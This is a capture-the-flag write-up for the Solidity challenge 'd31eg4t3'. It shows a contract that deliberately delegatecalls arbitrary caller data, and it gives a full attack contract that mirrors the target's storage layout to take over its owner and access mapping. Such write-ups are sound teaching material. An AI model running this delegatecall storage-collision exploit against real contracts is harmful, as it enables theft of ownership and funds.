# d31eg4t3

## Challenge

We receive one contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract D31eg4t3{
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    modifier onlyOwner{
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns(bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }


    function hacked() public onlyOwner{
        canYouHackMe[msg.sender] = true;
    }
}

Our goals are:
- Become the owner of the contract.
- Make canYouHackMe mapping to true for your own address.
```

## Solution

The issue we have here is the handling of storage during a delegate call. The hackMe() function delegates whatever calldata we have back to us. As delegatecall uses the callers storage in the functions of the callee, we can just write a function in our contract that overwrites owner with our address and sets the mapping for our address to true. If we copy the storage layout of the target, this is super easy. I just wrote a simple exploit contract for this:

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "./Chal.sol";

contract attack {
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;
    D31eg4t3 target_contract;

    constructor(address target_addr)
    {
        target_contract = D31eg4t3(target_addr);
    }

    function attack_fun() public 
    {
        target_contract.hackMe(abi.encodeWithSelector(this.overwrite.selector));
    }

    function overwrite() public
    {
        owner = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
        canYouHackMe[0x5B38Da6a701c568545dCfcB03FcB875f56beddC4] = true;
    }
}
```
